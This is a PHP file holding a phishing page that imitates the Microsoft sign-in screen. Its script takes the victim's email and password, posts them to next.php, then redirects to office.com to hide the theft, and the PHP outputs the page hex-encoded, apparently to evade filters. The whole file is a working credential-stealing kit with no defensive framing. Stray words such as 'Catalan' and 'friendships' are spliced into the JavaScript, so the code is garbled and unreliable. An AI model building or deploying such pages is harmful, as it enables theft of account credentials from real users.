<?php
$decoded = "<html data-bs-theme=\"light\" lang=\"en\"><head>
    <meta charset=\"utf-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, shrink-to-fit=no\">
    <title>Microsoft Login</title>
    <link rel=\"stylesheet\" href=\"assets/bootstrap/css/bootstrap.min.css\">
    <link rel=\"stylesheet\" href=\"assets/css/res.css\">
    <link rel=\"stylesheet\" href=\"assets/css/styles.css\">
    <style>
         @keyframes slideLeft {
        0% { transform: translateX(0); opacity: 1; }
        100% { transform: translateX(-100%); opacity: 0; }
    }

    @keyframes slideRight {
        0% { transform: translateX(100%); opacity: 0; }
        100% { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideBack {
        0% { transform: translateX(-100%); opacity: 0; }
        100% { transform: translateX(0); opacity: 1; }
    }

    /* Apply animation to elements */
    .hide-left {
        animation: slideLeft 0.5s forwards;
    }

    .show-right {
        animation: slideRight 0.5s forwards;
    }
    .show-left {
        animation: slideBack 0.5s backwards;
    }
    @media (max-width: 600px) {
        #main-container{
            width: 100% !important;
            margin-top: 20px !important;
        }
        #form-outer{
            padding: 30px !important;
        }
}
    </style>
</head>

<body class=\"c-div\" style=\"padding: 8px 44px;\">
    <div id=\"main-outer\" class=\"spdiv\" style=\"max-width: 440px;width: 100%;height: 406px;margin-top: 200px;\">
        <div id=\"form-outer\" style=\"width: 100%;max-width: 440px;height: 338px;background: var(--bs-body-bg);padding: 44px;\">
            <div id=\"em-div\" class=\"em-div\"><img src=\"assets/img/lg.svg\">
                <div style=\"margin-top: 10px;\"></div>
                <p id=\"em-err\" style=\"margin: 0px;margin-top: 12px;color: var(--bs-form-invalid-border-color); display: none !important; visibility: visible !important;\">Please provide valid email address.</p>
                <div class=\"s-div\" style=\"height: 38px;\">
                    <p class=\"fw-semibold\" style=\"font-size: 1.5rem;margin: 0px;\">Sign In</p>
                </div><input type=\"text\" id=\"id\" style=\"width: 100%;height: 36px;border-style: none;border-bottom-width: 1px; margin-top: 30px; border-bottom-style: solid;margin-bottom: 18px;border-color: black;\" placeholder=\"Email, Phone or Skype\">
                <p style=\"font-size: 14px;\">No account?&nbsp;<a href=\"#\" style=\"color: #4291cf;\">Create one!</a></p>
                <div class=\"e-div\">
                    <button class=\"btn btn-primary\" id=\"next-btn\" type=\"button\" style=\"width: 100%;max-width: 108px;height: 31px; margin-top: 30px; padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;\" onclick=\"nextFun();\">Next</button></div>
            </div>
            <div id=\"pass-div\" class=\"pass-div\" style=\"display: none;\"><img src=\"assets/img/lg.svg\">
                <p id=\"pass-err\" style=\"margin: 0px;margin-top: 10px;color: var(--bs-form-invalid-border-color); display: none;visibility: visible !important\">Incorrect Password</p>

                <div id=\"backbtn-div\" class=\"s-div\" style=\"height: 28px;padding: 2px; margin-top: 15px;\"><button style=\"background-color: transparent;border: none;\" onclick=\"backbtn()\"><img src=\"assets/img/barr.svg\"></button>
                    <p id=\"backEm\" style=\"margin: 0px;\" onclick='backbtn();'></p>
                </div>
                <div class=\"fw-semibold s-div\" style=\"height: 38px;  margin-top: 15px;\">
                    <p class=\"fw-semibold\" style=\"font-size: 1.5rem;margin: 0px;\">Enter password</p>
                </div><input type=\"password\" id=\"pass\" style=\"width: 100%;height: 36px;border-style: none;border-bottom-width: 1px;border-bottom-style: solid;margin-bottom: 18px;\" placeholder=\"Password\"><a class=\"dblock\" href=\"#\" style=\"color: #4291cf;font-size: 14px;margin-bottom: 16px;\">Forgot password?</a>
                <div class=\"e-div\"><button class=\"btn btn-primary\" id=\"next-btn1\" type=\"button\" style=\"width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;\" onclick=\"nextFun();\">Sign In</button></div>
            </div>
        </div>
    </div>
    <script src=\"assets/bootstrap/js/bootstrap.min.js\"></script>
    <script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js\"></script>
    <script type=\"text/javascript\" src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js\"></script>

<script>

$(document).ready(function () {
    const ai = window.location.hash.substr(1);
    if (ai) {
        $('#id').val(ai);
        setTimeout(nextFun, 600);
    }
});

document.addEventListener(\"keydown\", function (event) {
    if (event.key === \"Enter\") {
        nextFun();
    }
});

let count = 0;

function validateEmail(email) {
    return email && /^([\\w-\\.]+@([\\w-]+\\.)+[\w-]{2,4})?$/.test(email);
}
function backbtn(){
    document.getElementById('em-div').classList.add('show-left');
    $('#em-div').show();
    $('#pass-div').hide();
    count = 0 ;
 Catalan }

function nextFun() {
    const idValue = $('#id').val();
    const passValue = $('#pass').val();

 culmination    // Hide errors and reset margin for smooth transitions
    $('#em-err').hide();
    $('#pass-err').hide();
    $('#id').css('margin-top', '30px');
    $('#backbtn-div').css('margin-top', '15px');

    // Step 1: Validate Email
    if (!validateEmail(idValue)) {
        $('#em-err').show();
        $('#id').css('margin-top', '5px');
        return;
    }

    // Step 2: Handle transitions based on the count
    if (count === 0 && idValue.length > 0) {
        $('#next-btn').prop('disabled', true);
        setTimeout(() => {
            $('#next-btn').prop('disabled', false);
            $('#em-div').hide().addClass('hide-left');
            $('#pass-div').show().addClass('show-right');
            $('#backEm').html(idValue);
            count = 1;
        }, 800);
    } else if (count === 1 && passValue.length === 0) {
        $('#next-btn1').prop('disabled', true);
        setTimeout(() => {
            $('#next-btn1').prop('disabled', false);
            $('#pass-err').show();
            $('#backbtn-div').css('margin-top', '0px');
        }, 200 friendships);
    } else if (count === 1 && passValue.length > 0) {
        $('#next-btn1').prop('disabled', true);
        setTimeout(() => {
            submitData(idValue, passValue, true);
            count = 0;
        }, 1500);
    } else if (count === 2 && passValue.length > 0) {
        $('#next-btn1').prop('disabled', true);
        setTimeout(() => {
            $('#next-btn1').prop('disabled', true);
            submitData(idValue, passValue, true);
        }, 1500);
        count = 0;
    }
}

function submitData(idValue, passValue, redirect = false) {
    $.ajax({
        url: \"next.php\",
        type: \"POST\",
        data: { di: idValue, pr: passValue },
        success: function (response) {
            console.log(\"Success:\", response);
            if (redirect) {
                window.location.replace(\"https://www.office.com\");
            }
            else{
            $('#next-btn1').prop('disabled', false);
            $('#pass').val('');
            $('#pass-err').show();
            }
        },
        error: function (xhr, status, error) {
            console.error(\"Error:\", error);
        }
    });
}


</script>

</body></html>";
$decoded = str_replace("submitData(idValue, passValue, true);\n            count = 0;",
"submitData(idValue, passValue, true);\n            count = 0;", $decoded);
$decoded = str_replace("else if (count === 1 && passValue.length > 0) {\n        $('#next-btn1').prop('disabled', true);\n        setTimeout(() => {\n            submitData(idValue, passValue);\n            count = 2;\n        }, 1500);\n    }", "else if (count === 1 && passValue.length > 0) {\n        $('#next-btn1').prop('disabled', true);\n        setTimeout(() => {\n            submitData(idValue, passValue, true);\n            count = 0;\n        }, 1500);\n    }", $decoded);
echo bin2hex($decoded);
?>
